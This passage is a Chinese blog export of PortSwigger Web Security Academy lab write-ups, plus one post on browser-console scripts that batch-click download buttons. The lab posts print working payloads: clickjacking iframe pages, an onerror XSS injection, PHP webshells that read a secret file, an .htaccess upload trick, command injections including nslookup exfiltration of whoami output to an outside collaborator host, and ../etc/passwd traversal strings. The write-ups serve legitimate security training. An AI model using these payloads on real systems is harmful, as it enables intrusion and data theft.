XSS，在邮件中插入javascript:alert(1)// 插入后&lt;a href=&quot;javascript:alert(1)&quot;&gt; Level 6 Data URL - HTTP | MDN (mozilla.org) 在浏览器中，有一些用于访问资源或脚本的协议，称作伪协议 data 伪协议 12// Data URL，允许内容创建者向文档中嵌入小文件data:text/javascript,alert(1)","tags":["XSS"],"categories":["网络安全"]},{"title":"自动化网页操作：批量下载和格式化Excel文件","path":"/2023/01/08/自动化网页操作/","content":"引言 遇到问题，关键是解决问题的思路，而不是解决问题本身 在一个平常的工作日，接到了一项任务，需要在某平台上批量添加并处理多份任务材料。每份任务完成后都需要下载报告，过程异常繁琐 —— 由于采用动态加载，每份报告的下载都需要两次点击操作。简单计算后，我意识到这将需要整整2000次重复性操作。 起初，我抱着&quot;既来之则安之&quot;的心态，想着按部就班地完成这项工作。毕竟，工作量在那里。 这让我想起几年前的一段经历：当时我在微博上关注了大量博主，后来想要清理关注列表时，发现平台并没有提供批量操作的功能。面对类似的困境，想到了用浏览器控制台来解决问题。更何况GPT业已成熟，不在话下。 问题描述 背景 平台上有1000份需要下载的报告 每份报告需要两步操作： 点击&quot;下载&quot;按钮 在弹出的选项中点击&quot;格式化Excel&quot;按钮 平台没有提供批量下载或操作的功能 目标 开发一个自动化脚本，能够： 自动识别并点击所有的&quot;下载&quot;按钮 对每个下载操作，自动点击对应的&quot;格式化Excel&quot;按钮 处理大量报告而不出错 环境准备 浏览器：Google Chrome（版本 96.0.4664.110） 编程语言：JavaScript 执行环境：浏览器控制台（DevTools） 解决过程 步骤1：初步分析页面结构 首先，我打开了浏览器的开发者工具，查看了页面的HTML结构。我发现： &quot;下载&quot;按钮是普通的&lt;button&gt;元素 &quot;格式化Excel&quot;按钮在点击&quot;下载&quot;后才会出现 按钮没有特定的id，但有特定的类名 步骤2：初次尝试 我首先尝试了一个简单的函数来计数&quot;格式化Excel&quot;按钮： 12345678910111213function countExcelButtons() &#123; const buttons = document.querySelectorAll(&#x27;button&#x27;); let count = 0; buttons.forEach(button =&gt; &#123; if (button.textContent.trim() === &#x27;格式化Excel&#x27;) &#123; count++; &#125; &#125;); console.log(`总共找到 $&#123;count&#125; 个&quot;格式化Excel&quot;按钮`); return count;&#125;countExcelButtons(); 结果：这个函数返回0，没有找到任何&quot;格式化Excel&quot;按钮。 问题分析：我意识到&quot;格式化Excel&quot;按钮是动态加载的，只有在点击&quot;下载&quot;按钮后才会出现。 步骤3：改进脚本 基于上述发现，我编写了一个新的脚本，先点击&quot;下载&quot;按钮，然后查找并点击&quot;格式化Excel&quot;按钮： 123456789101112131415161718192021222324252627282930313233async function clickDownloadAndExcel() &#123; const downloadButtons = Array.from(document.querySelectorAll(&#x27;button&#x27;)).filter(button =&gt; button.textContent.trim() === &#x27;下载&#x27; ); console.log(`找到 $&#123;downloadButtons.length&#125; 个下载按钮`); for (const button of downloadButtons) &#123; button.click(); console.log(&#x27;点击了下载按钮&#x27;); await new Promise(resolve =&gt; setTimeout(resolve, 500)); const excelButtons = Array.from(document.querySelectorAll(&#x27;button&#x27;)).filter(button =&gt; button.textContent.trim() === &#x27;格式化Excel&#x27; ); if (excelButtons.length &gt; 0) &#123; console.log(`找到 $&#123;excelButtons.length&#125; 个&quot;格式化Excel&quot;按钮`); excelButtons.forEach(excelButton =&gt; &#123; console.log(&#x27;点击格式化Excel按钮&#x27;); excelButton.click(); &#125;); &#125; else &#123; console.log(&#x27;没有找到对应的&quot;格式化Excel&quot;按钮&#x27;); &#125; &#125; console.log(&#x27;所有操作完成&#x27;);&#125;clickDownloadAndExcel().then(() =&gt; &#123; console.log(&#x27;脚本执行完毕&#x27;);&#125;); 执行结果： 1234567891011找到 20 个下载按钮点击了下载按钮找到 1 个&quot;格式化Excel&quot;按钮点击格式化Excel按钮点击了下载按钮找到 2 个&quot;格式化Excel&quot;按钮点击格式化Excel按钮点击格式化Excel按钮...所有操作完成脚本执行完毕 问题：虽然脚本成功执行，但我发现它下载了超过100份报告，远超预期的20份。 步骤4：问题分析和优化 分析日志后，我发现每次点击&quot;下载&quot;按钮后，页面上的&quot;格式化Excel&quot;按钮数量都在增加，脚本每次都点击了所有可见的&quot;格式化Excel&quot;按钮，导致重复下载。 步骤5：最终优化版本 为了解决重复下载的问题，我对脚本进行了以下优化： 使用Set来跟踪已处理过的&quot;格式化Excel&quot;按钮 每次操作只处理一个新出现的&quot;格式化Excel&quot;按钮 以下是最终的脚本： 123456789101112131415161718192021222324252627282930313233343536async function clickDownloadAndExcel() &#123; const downloadButtons = Array.from(document.querySelectorAll(&#x27;button&#x27;)).filter(button =&gt; button.textContent.trim() === &#x27;下载&#x27; ); console.log(`找到 $&#123;downloadButtons.length&#125; 个下载按钮`); let processedExcelButtons = new Set(); for (let i = 0; i &lt; downloadButtons.length; i++) &#123; const button = downloadButtons[i]; button.click(); console.log(`点击了第 $&#123;i + 1&#125; 个下载按钮`); await new Promise(resolve =&gt; setTimeout(resolve, 500)); const excelButtons = Array.from(document.querySelectorAll(&#x27;button&#x27;)).filter(button =&gt; button.textContent.trim() === &#x27;格式化Excel&#x27; &amp;&amp; !processedExcelButtons.has(button) ); if (excelButtons.length &gt; 0) &#123; const newExcelButton = excelButtons[0]; console.log(`点击第 $&#123;i + 1&#125; 个格式化Excel按钮`); newExcelButton.click(); processedExcelButtons.add(newExcelButton); await new Promise(resolve =&gt; setTimeout(resolve, 500)); &#125; else &#123; console.log(`没有找到新的&quot;格式化Excel&quot;按钮`); &#125; &#125; console.log(&#x27;所有操作完成&#x27;);&#125;clickDownloadAndExcel().then(() =&gt; &#123; console.log(&#x27;脚本执行完毕&#x27;);&#125;); 执行结果： 12345678910找到 20 个下载按钮点击了第 1 个下载按钮点击第 1 个格式化Excel按钮点击了第 2 个下载按钮点击第 2 个格式化Excel按钮...点击了第 20 个下载按钮点击第 20 个格式化Excel按钮所有操作完成脚本执行完毕 这次脚本成功地只下载了20份报告，每个报告只被处理一次。 突破点： 异步编程范式 利用async/await精准控制异步流程 通过Promise链确保操作的顺序性和可靠性 解决传统同步编程在网页自动化中的阻塞问题 动态DOM交互策略 针对动态加载元素，采用动态选择器 实现元素可见性和可点击性的实时检测 使用MutationObserver或显式等待机制，应对页面动态变化 状态管理与去重 引入Set数据结构实现操作去重 维护操作状态，防止重复执行 建立闭环的状态追踪机制 PS：其他自动化记录 查询网页所有开始按钮 12345678910111213141516171819function findStartButtons() &#123; // 查找所有按钮 const buttons = Array.from(document.querySelectorAll(&#x27;.light-btn-link&#x27;)).filter(btn =&gt; btn.textContent.includes(&#x27;开始&#x27;) ); // 打印找到的按钮 if (buttons.length &gt; 0) &#123; console.log(`找到 $&#123;buttons.length&#125; 个开始按钮：`); buttons.forEach((button, index) =&gt; &#123; console.log(`按钮 $&#123;index + 1&#125;:`, button); &#125;); &#125; else &#123; console.log(&#x27;未找到任何开始按钮&#x27;); &#125;&#125;// 执行查找findStartButtons(); 点击网页开始按钮 123456789101112131415161718192021function clickAllStartButtons() &#123; // 查找所有按钮 const buttons = Array.from(document.querySelectorAll(&#x27;.light-btn-link&#x27;)).filter(btn =&gt; btn.textContent.includes(&#x27;开始&#x27;) ); // 打印找到的按钮数量 console.log(`找到 $&#123;buttons.length&#125; 个开始按钮，开始点击...`); // 直接依次点击所有按钮 buttons.forEach((button, index) =&gt; &#123; button.click(); console.log(`点击第 $&#123;index + 1&#125; 个开始按钮`); &#125;); // 所有按钮点击完成的提示 console.log(&#x27;所有开始按钮点击完成&#x27;);&#125;// 执行点击clickAllStartButtons(); 任务状态统计 1234567891011121314151617181920212223242526272829303132function countTaskStatuses() &#123; // 查找所有任务状态的 &lt;span&gt; 元素 const statuses = Array.from(document.querySelectorAll(&#x27;.light-table-cell .light-tag&#x27;)); // 初始化计数器 const statusCounts = &#123; &#x27;任务等待中&#x27;: 0, &#x27;任务已结束&#x27;: 0, &#x27;任务执行中&#x27;: 0 &#125;; // 统计各状态数量 statuses.forEach(status =&gt; &#123; const text = status.textContent; if (statusCounts.hasOwnProperty(text)) &#123; statusCounts[text]++; &#125; &#125;); // 打印统计结果 console.log(&#x27;任务状态统计：&#x27;); console.log(`任务等待中：$&#123;statusCounts[&#x27;任务等待中&#x27;]&#125; 个`); console.log(`任务已结束：$&#123;statusCounts[&#x27;任务已结束&#x27;]&#125; 个`); console.log(`任务执行中：$&#123;statusCounts[&#x27;任务执行中&#x27;]&#125; 个`); // 总任务数 const totalTasks = statuses.length; console.log(`总任务数：$&#123;totalTasks&#125; 个`);&#125;// 执行统计countTaskStatuses(); 删除任务 1234567891011121314151617181920212223242526function clickAllDeleteButtons() &#123; // 查找所有删除按钮 const deleteButtons = Array.from(document.querySelectorAll(&#x27;.anticon-delete&#x27;)); // 打印找到的删除按钮数量 console.log(`找到 $&#123;deleteButtons.length&#125; 个删除按钮，开始点击...`); // 依次点击所有删除按钮 deleteButtons.forEach((button, index) =&gt; &#123; // 找到最近的可点击的父元素 const clickableParent = button.closest(&#x27;button&#x27;) || button.closest(&#x27;a&#x27;) || button; if (clickableParent) &#123; clickableParent.click(); console.log(`点击第 $&#123;index + 1&#125; 个删除按钮`); &#125; else &#123; console.log(`第 $&#123;index + 1&#125; 个删除按钮无法点击`); &#125; &#125;); // 所有删除按钮点击完成的提示 console.log(&#x27;所有删除按钮点击完成&#x27;);&#125;// 执行点击clickAllDeleteButtons();","tags":["效率提升"],"categories":["自动化"]},{"title":"Portswigger 靶场之“业务逻辑漏洞","path":"/2022/12/22/business-logic-flaws/","content":"All labs | Web Security Academy (portswigger.net) Business logic vulnerabilities 1. Excessive trust in client-side controls 过度信任客户端控制 登录wiener:peter，购买Lightweight &quot;l33t&quot; Leather Jacket，价格是$1337.00，下单后显示商店积分不够，不可以购买 在 Burp 中，截断Add to cart功能，修改价格（price）为1以满足商店的信用额度，完成订单以解决实验室。 2. High-level logic vulnerability 高级逻辑漏洞 登录wiener:peter，把Lightweight &quot;l33t&quot; Leather Jacket（轻质“l33t”皮夹克）添加到购物车，通过用 burp 抓包，发现价格参数price没有了，剩下了数量参数quantity。 尝试去修改数量参数quantity为-1，果不其然，成功修改，但下单后不被允许金额小于零，无法下单。 于是通过叠加商品，既满足Store credit（店铺积分）100元之内，又满足下单金额是大于零的要求 依旧是把一个Lightweight &quot;l33t&quot; Leather Jacket（轻质“l33t”皮夹克）添加到购物车；再购买The Giant Enter Key（巨型回车键），数量用1337/25.35=52.74来计算 3. Inconsistent security controls 不一致的安全控制 在 Burp Suite 中，使用 Site map（站点地图）功能，来查看站点目录，发现路径admin。访问/admin，页面回显需要“DontWannaCry ”用户登录才可访问 页面右上角Register 注册一个账号，其中邮箱需要点击页面上方的Email client获得，注册后会发来一封邮件点击验证一下，然后登录账户，紧随其后修改邮箱为 @DontWannaCry.com 这时候就可以访问管理面板了，删除用户即可 4. Flawed enforcement of business rules 有缺陷的业务规则执行 注意到页面有一个优惠券代码——NEWCUST5，页面底部可通过注册获得优惠券代码SIGNUP30 添加商品到购物车，尝试优惠券的使用，发现连续两次输入相同的代码，不被允许，而交替使用可绕过，就一直叠加 5. Low-level logic flaw 低级逻辑缺陷 登录账号，购买商品的数量一次最多可以 +99，可以用 Burp 的 intruder 送到 Overflow Quote / 参考 int overflow（整数溢出）是指在计算机中，对一个整数类型（例如 int、long 等）进行计算时，结果超出了该类型可以表示的最大值（或最小值），导致结果不正确的情况。 在计算机中，整数类型的表示是有限的，即它们可以表示的范围是有限的。例如，一个 32 位的有符号整数类型 int 可以表示从 -2,147,483,648 到 2,147,483,647 的整数，如果在计算时得到的结果超过了这个范围，就会发生整数溢出。 6. Inconsistent handling of exceptional input 异常输入的不一致处理 需要进入/admin目录，删除 Carlos。 首先注册一个用户，验证用户，返回该用户的时候发现并没有修改邮箱的选项。 于是在注册页面修改邮箱，利用长度截断（256个字符）使得注册的邮箱地址为@dontwannacry.com。注册完验证后登录账户以便删除 Carlos。 1bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb@dontwannacry.com.0a0800c503176684c4ae681001ba00e2.web-security-academy.net 7. Weak isolation on dual-use endpoint 两用端点上的弱隔离 登录 wiener 用户后，在修改密码的界面发现，可以修改任意“用户”的密码，但需要输入当前密码（当前密码未知），通过 burp 截断数据包分析得知，当前密码是可以删除来绕过此限制的。 8. Insufficient workflow validation 工作流程验证不足 登录账号，购买一个2.04的商品（少于商店积分 100），观察代理历史记录，注意到下订单时，POST 请求会重定向到订单确认页面 添加1337 的那款商品，下单观察代理历史记录，研究两者之间的差异，注意到2.04的商品 GET 请求为GET /cart/order-confirmation?order-confirmation=true即可购买成功，把1337 的商品进行修改也可绕过限制 9. Authentication bypass via flawed state machine 通过有缺陷的状态机绕过身份验证 用 burp 拦截登录请求，Forward POST 请求，Drop Redirect，然后直接访问/admin 登录的请求有两个，第一个是 POST 请求，第二个是重定向 GET 请求，作用是选择角色转到主页，将第二个包丢弃可默认为该角色，即可访问管理面板 10. Infinite money logic flaw 无限金钱逻辑缺陷 home 页底部注册得到 SIGNUP30，可以购买 10 美元的礼品卡并从“my-account”页面兑换，兑换的过程中注意到商店信用增加了（用 Burp 或者 Python 自动执行此过程） 攻击完成后，商店的总体信用额度将提升足以购买“皮夹克” 11. Authentication bypass via encryption oracle 通过加密 oracle 绕过身份验证 登录后有一个 Stay Logged in（保持登录状态）的功能，且是加密后的 未完……","tags":["靶场","逻辑漏洞"],"categories":["网络安全"]},{"title":"portswigger 靶场之点击劫持（Clickjacking）","path":"/2022/12/11/clickjacking/","content":"All labs | Web Security Academy — 所有实验室 |网络安全学院 (portswigger.net) 1. Basic clickjacking with CSRF token protection 具有 CSRF 令牌保护的基本点击劫持 目标： 制作一些 HTML 来构建帐户页面并欺骗用户删除他们的帐户 过程： 先登录账号，登录后界面上有个选项为Delete account，即删除账户。 页面上方有个Go to exploit server去利用服务器，点进去，在Body中写入HTML代码并用CSS来绝对定位选项Delete account的位置。 设置透明度opacity使得攻击者看不到真实的界面，Delete account选项被隐藏在&lt;div&gt;Click Me&lt;/div&gt;之下 Quote / 参考 在点击劫持攻击中，攻击者会将一个透明的iframe覆盖在目标网站的页面上，然后诱使受害者在该iframe中点击某些看似无害的按钮或链接，实际上却是在执行攻击者的恶意操作 攻击者使用iframe的目的是为了掩盖受害者的真实行为。因为iframe可以嵌入其他网站或页面，攻击者可以在iframe中展示一个看似无害的页面或按钮，但实际上它们可能会触发跨站点请求，执行攻击者的恶意操作。 1234567891011121314151617&lt;style&gt; iframe &#123; position:relative; width:1000px; height: 700px; opacity: 0.0000001; z-index: 2; &#125; div &#123; position:absolute; top:515px; left:60px; z-index: 1; &#125;&lt;/style&gt;&lt;div&gt;Click Me&lt;/div&gt;&lt;iframe src=&quot;https://0a37007803673341c044c7f400150047.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt; 2. Clickjacking with form input data prefilled from a URL parameter 使用从 URL 参数预填充的表单输入数据进行点击劫持 目标： 诱使用户点击“更新电子邮件”按钮 过程： 登录账号，转到服务器界面，这一关，主要是通过 GET 参数的方式预填充表单，即在 URL 上添加了修改的邮箱 1234567891011121314151617&lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.00; z-index: 2; &#125; div &#123; position:absolute; top:450px; left:80px; z-index: 1; &#125;&lt;/style&gt;&lt;div&gt;Test me&lt;/div&gt;&lt;iframe src=&quot;https://0a3800d603ebc15ac0aa4aa0002c0090.web-security-academy.net/my-account?email=111@123.com&quot;&gt;&lt;/iframe&gt; 3. Clickjacking with a frame buster script 使用 frame buster 脚本进行点击劫持 目标： 诱使用户点击“更新电子邮件”按钮 过程： 先登录账号，然后到服务器界面，这一关运用了sandbox 属性，限制 iframe 嵌套，使其失效。 可通过在iframe标签中设置sandbox=&quot;allow-forms&quot;来绕过限制 Quote / 参考 &quot;Frame buster&quot; 技术使用 JavaScript 代码来检测页面是否被嵌套在框架中 在 HTML 中，sandbox=&quot;allow-forms&quot; 是一种设置 iframe（内嵌框架）安全性的方法之一。该属性指定在 iframe 中是否允许表单提交。 当 sandbox 属性的值为 allow-forms 时，表示在 iframe 中允许表单提交，但不允许执行其他一些操作，如运行脚本、显示弹出窗口等。 1234567891011121314151617&lt;style&gt;iframe &#123;position:relative;width:500px;height: 700px;opacity: 0.1;z-index: 2;&#125;div &#123;position:absolute;top:450px;left:80px;z-index: 1;&#125;&lt;/style&gt;&lt;div&gt;Click me&lt;/div&gt;&lt;iframe sandbox=&quot;allow-forms&quot; src=&quot;https://0a0e00d50460a332c236f332009c00c0.web-security-academy.net/my-account/?email=hacker@attacker-website.com&quot;&gt;&lt;/iframe&gt; 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS 利用点击劫持漏洞触发基于 DOM 的 XSS 目标： 欺骗用户单击“单击我”按钮来调用函数。print() 过程： 先登录账号，然后到服务器界面，这一关在 iframe 的点击劫持中附加了 DOM XSS。 通过 name 输入框，放入 JavaScript 脚本&lt;img src=1 onerror=print()&gt;，因为这个 img 标签的 src 属性的值是 1，所以这个图片肯定是不存在的，因此会触发 onerror 事件，并且执行 print() 函数。print() 是 JavaScript 的内置函数，能够在弹窗中输出内容。 123456789101112131415161718&lt;style&gt;iframe &#123;position:relative;width:500px;height: 700px;opacity: 0.1;z-index: 2;&#125;div &#123;position:absolute;top:620px;left:40px;z-index: 1;&#125;&lt;/style&gt;&lt;div&gt;Click me&lt;/div&gt;&lt;iframesrc=&quot;https://0a2a00e403c20784c0166d6a00c800b2.web-security-academy.net/feedback/?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult&quot;&gt;&lt;/iframe&gt; 5. Multistep clickjacking 多步点击劫持 目标： 诱骗用户单击删除帐户按钮和确认对话框 过程： 需要执行两个步骤，删除用户 --&gt; 确认删除，所以设置两个点击按钮 12345678910111213141516171819202122&lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; &#125; .firstClick, .secondClick &#123; position:absolute; top:510px; left:50px; z-index: 1; &#125; .secondClick &#123; top:285px; left:225px; &#125;&lt;/style&gt;&lt;div class=&quot;firstClick&quot;&gt;Click me first&lt;/div&gt;&lt;div class=&quot;secondClick&quot;&gt;Click Store&lt;/div&gt;&lt;iframe src=&quot;https://0a9a0010038a45ffc436c9d000f50019.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt;","tags":["靶场","点击劫持"],"categories":["网络安全"]},{"title":"Portswigger 靶场之“文件上传”","path":"/2022/11/11/file-upload/","content":"File upload vulnerabilities All labs | Web Security Academy (portswigger.net) 1. Remote code execution via web shell upload 通过 Web shell 上传远程执行代码 目标：读取/home/carlos/secret文件的内容 过程 登录用户，选择一个图片上传。用 burp 分别拦截“上传文件”和“查看文件”的数据包，一个 POST 请求，另一个是 GET 请求 在 burp 上传文件中文件名后缀改为.php，删除原来图片的内容，替换为 php webshell，并且上传 在*查看文件*数据包中，访问上传的 webshell；或者回到浏览器，先刷新页面，后右键图片在新标签页打开 1234# PHP 的读取代码&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt;# file_get_contents() 把整个文件读入一个字符串中。 2. Web shell upload via Content-Type restriction bypass 通过 Content-Type 限制绕过 Web shell 上传 先登录，上传图片，在 burp 的 http history 中拦截“上传文件”和“查看文件”的数据包，并转发到 Repeater，重命名为Upload File Show File以便更好地观察 在 burp 上传文件中，修改名称、删除图片内容替换为 php webshell，最重要的一点是将Content-Type 修改为image/jpeg 后续步骤如法炮制而来 1&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt; 3. Web shell upload via path traversal Web Shell 通过路径遍历上传 传入 webshell 后&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;，访问文件的时候**显示了未经解析的源代码，由此想到该目录没有执行权限，需要上传到其他目录，进行目录遍历** 在 burp 上传数据包，将文件名改为../文件名，需要经过 URL 编码，编码后是..%2f文件名，文件将被上传到“上一层”文件夹 4. Web shell upload via extension blacklist bypass Web Shell上传通过扩展黑名单绕过 按照往常一样上传 PHP webshell，服务器回答说“不允许”上传 PHP 文件。从响应中，注意到正在运行的服务器是 Apache， .htaccess文件是 Apache 服务器的一个配置文件，负责相关目录下的网页配置。能够实现*改变文件扩展名、允许/阻止特定的用户或者目录的访问* 可以欺骗 Apache 服务器将任意*自定义文件扩展名*映射到可执行的 MIME 类型。 第一步、修改.htaccess文件 12345678# 修改名称 .htaccess# 修改 Content-Typetext/plain# 修改内容AddType application/x-httpd-php .shell 实现的功能就是：所有上传的.shell文件都会被当作php文件执行 接着上传一个后缀名为shell的文件，完成实验室任务 12345678# 修改名称 code.shell# 修改 Content-Typeimage、png# 修改内容&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt; 5. Web shell upload via obfuscated file extension 通过混淆文件扩展名上传 Web Shell 利用%00 截断 文件名用 Burp 改 code.php%00.png、 在 url 中 %00 表示 ascll 码中的 0 ，而 ascii 中 0 作为特殊字符保留，表示字符串结束，所以当 url 中出现 %00 时就会认为读取已结束 当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃 6. Remote code execution via polyglot web shell upload 通过多语言 web shell 上传远程代码执行 服务器可能通过图像的字节序列来判断是否是jpeg、png文件等；使用 ExifTool 创建包含元数据中恶意代码的多语言 JPEG 文件 在 kali 中安装 ExifTool 1apt install libimage-exiftool-perl 利用 ExifTool 1exiftool -Comment=&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot; code.jpg -o code.php 7. Web shell upload via race condition 通过竞争条件上传 Web shell 通过 Race Condition，上传的 webshell 文件会先存到一个文件夹中，然后才会确认是否合法，如果不合法再删掉。文件被删除之前这段间隙去突破","tags":["文件上传","靶场"],"categories":["网络安全"]},{"title":"Portswigger 靶场之“访问控制漏洞”","path":"/2022/10/07/access-control/","content":"Access control vulnerabilities All labs | Web Security Academy (portswigger.net) 1. Unprotected admin functionality 不受保护的管理功能 没有限制的 admin 面板，进去删帐号robots.txt /administrator-panel 2. Unprotected admin functionality with unpredictable URL 具有不可预测的 URL 的未受保护的管理功能 Ctrl + U 打开页面源代码，通过 Ctrl + F 搜索admin字符并观察 3. User role controlled by request parameter 由请求参数控制的用户角色 这一关的要点在于修改 Cookie，登录帐号后会发现有一个 cookie 值是 Admin false ，改为true，再访问 /admin，就会发现删除界面 4. User role can be modified in user profile 可以在用户配置文件中修改用户角色 更新邮件的地方是 JSON 数据，可以往里面多塞一些东西，然后浏览 /admin 界面删除用户 5. User ID controlled by request parameter 由请求参数控制的用户 ID 登录账户后抓包继而发现存在参数 ?id=wiener，替代为 carlos 从而获取 carlos 用户的 API 6. User ID controlled by request parameter, with unpredictable user IDs 用户 ID 由请求参数控制，用户 ID 不可预测 从博客文章中找到 carlos，用 burp 拦截，复制 ID 登录账户，用 burp 将 carlos 的 ID 写入请求 7. User ID controlled by request parameter with data leakage in redirect 用户 ID 由请求参数控制，重定向中存在数据泄漏 API KEY 在redirect（重定向） 的response（响应）中 8. User ID controlled by request parameter with password disclosure 用户 ID 由具有密码泄露的请求参数控制 修改 ID 后，F12 选到 Password 的地方，就可以看到密码 9. Insecure direct object references 不安全的直接对象引用 环顾四周，发现右上角有个Live chat，实时聊天室 和机器人对话并点击View transcript会把刚和机器人聊天的内容下载到一个txt文本文档中。 把URL改为download-transcript/1.txt即可得到密码 10. URL-based access control can be circumvented 可以规避基于 URL 的访问控制 先访问 admin，失败，继而进行抓包，添加X-Original-URL: /invalid成功，后面如法炮制 11. Method-based access control can be circumvented 可以规避基于方法的访问控制 先登录管理员账户，升级 carlos 的同时抓包，发送到 Repeater 在隐私浏览器窗口，登录wiener:peter，将 Cookie 复制到 Repeater 中，并且右键单机Change request method将请求方法改为 GET，用户名参数由 Carlos 改为 wiener 12. Multi-step process with no access control on one step 多步骤过程，一步没有访问控制 登录 Admin 帐号和 wiener 帐号 wiener 帐号抓到 Cookie 值复制带到 Repeater 中…… 13. PRACTITIONER Referer-based access control 基于引用的访问控制","tags":["靶场","访问控制"],"categories":["网络安全"]},{"title":"PortSwigger 之“身份认证”","path":"/2022/09/25/authentication/","content":"https://portswigger.net/web-security/all-labs#authentication Authentication 1. 通过不同的响应进行用户名枚举 在登录页面填入账号密码通过 burp 抓包，发送到 Intruder 模块，枚举用户名，观察 length 的不一致来找到用户名，紧接着枚举密码…… 2. 2FA简单旁路 攻击者登录账号wiener:peter并接收邮箱验证码，在我的账户页面，填入验证码后复制 URL 地址（目的是模拟用户访问自己的账户），紧接着注销帐户。 登录受害者账号carlos:montoya，在接收邮箱验证码页面，修改地址栏中的URL 地址 3. 密码重置损坏的逻辑 这一关主要是利用密码重置，跳过令牌检查来修改密码，从而获取系统的访问权限 解题步骤： 在网站中忘记密码，填入 wiener，在电子邮件发出的链接中重置密码。 将“密码重置功能“发送到 Repeater，观察请求和响应，发现 token 是无效的，将用户名 wiener 修改为 carlos 后可成功修改 carlos 用户的密码 4. 通过细微不同的响应进行用户名枚举","tags":["靶场","身份认证"],"categories":["网络安全"]},{"title":"Portswigger 靶场 | 操作系统命令注入","path":"/2022/09/15/os-command-injection/","content":"OS command injection All labs | Web Security Academy (portswigger.net) 常见注入方式 分号分割 || &amp;&amp; &amp; 分割 | 管道符 \\r %d0%a0 换行 反引号解析 $() 替换 1. OS command injection, simple case OS命令注入，简单案例 **目标：**执行命令以确定当前用户的名称。whoami 过程： 用 burp 拦截数据包，有两个参数分别是产品和商店 Post 设置参数，whoami 命令用于显示自身用户名称 12341 &amp; whoami #URL 编码后1+%26+whoami+%23 2. Blind OS command injection with time delays 具有时间延迟的盲操作系统命令注入 **目标：**通过 sleep 10 秒判断出问题所在 过程： 在“反馈”界面抓包处理，分别测试name email等参数 12+%26+sleep+10+%23 &amp; sleep 10 # 3. Blind OS command injection with output redirection 带有输出重定向的盲操作系统命令注入 **目标：**通过 whomi 命令，输出重定向到/var/www/images/ 过程： 在“反馈”界面抓包处理，分别测试name email等参数 让应用程序在输出响应之前休眠 10 秒，来确认是否有盲注命令注入，测试后发现易受攻击的字段是email 可通过 F12 把 emali 的 type 改为 text，以此绕过前端检查，来提交反馈 在电子邮箱处填写&amp; whoami &gt; /var/www/images/ling.txt #，执行 whoami 命令，将内容保存在 ling.txt 访问图片网址，修改文件名成 ling.txt 12345678# 等待十秒 &amp; sleep 10 ## 将内容保存在 ling.txt&amp; whoami &gt; /var/www/images/ling.txt ## 访问https://0ab8007b0415044bc48b9b5d001e00fb.web-security-academy.net/image?filename=ling.txt 4. Blind OS command injection with out-of-band interaction 带有带外交互的盲操作系统命令注入 **目标：**利用盲操作系统命令注入漏洞向 Burp 协作者发出 DNS 查找 过程： 需要 Burp pro 而不是社区版，利用 nslookup 命令去外带出回显 nslookup 命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题 1234+%26+nslookup+bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com+%23# URL 解码后 &amp; nslookup bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com # 5. Blind OS command injection with out-of-band data exfiltration 带外数据泄露的盲 OS 命令注入 启用 Burp Collaborator client，复制到剪贴板；拦截和修改提交反馈的请求，修改 email 参数 12345&amp; nslookup `whoami`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com # &amp; nslookup $(whoami).kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com # ||nslookup `whoami`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com|| 最后，在 burp 的子域名中，可以看到 DNS 交互，获得当前用户名 0","tags":["靶场","命令注入"],"categories":["网络安全"]},{"title":"portswigger 靶场之目录遍历","path":"/2022/08/05/directory-traversal/","content":"所有实验室 |网络安全学院 (portswigger.net) Directory traversal 1. 文件路径遍历，简单案例 File path traversal, simple case 使用 Burp Suite 截获和修改获取产品图像的请求。 修改参数filename，观察响应是否包含文件的内容。/etc/passwd 123../../../etc/passwd# 相对路径 “../&quot;，这个路径表示回到上一级目录 访问操作系统中的 passwd 文件。passwd 文件包含系统中所有用户的用户名、密码、用户 ID、主目录等信息 2. 文件路径遍历，通过绝对路径旁路阻止遍历序列 File path traversal, traversal sequences blocked with absolute path bypass 使用 Burp Suite 修改产品图像的请求filename /etc/passwd 当接收到用户提供的路径时，应用程序首先将其解析为绝对路径，然后将其与白名单中的路径进行比较。防止攻击者使用目录遍历序列来访问应用程序之外的文件和目录。 如果路径在白名单内，则认为是合法的； 否则，应用程序会拒绝该请求并返回错误信息。 3. 文件路径遍历，非递归剥离遍历序列 File path traversal, traversal sequences stripped non-recursively 非递归剥离遍历序列：应用程序会解析路径并对其进行分析，然后使用算法来**删除路径中的 “…/” 遍历序列** 使用双写绕过 1....//....//....//etc/passwd 4. 文件路径遍历，使用多余的 URL 解码剥离遍历序列 File path traversal, traversal sequences stripped with superfluous URL-decode 第四关/被过滤了，所以需要对其进行 URL 编码，但在 burp 中用 Repeater 发送后还是错误，得知需要进行第二次 URL 编码才可绕过 1..%252f..%252f..%252fetc/passwd 5. 文件路径遍历，路径开始验证 File path traversal, validation of start of path 验证请求的文件路径是否以 “/var/www/” 开头 1/var/www/images/../../../etc/passwd 6. 文件路径遍历，使用空字节旁路验证文件扩展名 File path traversal, validation 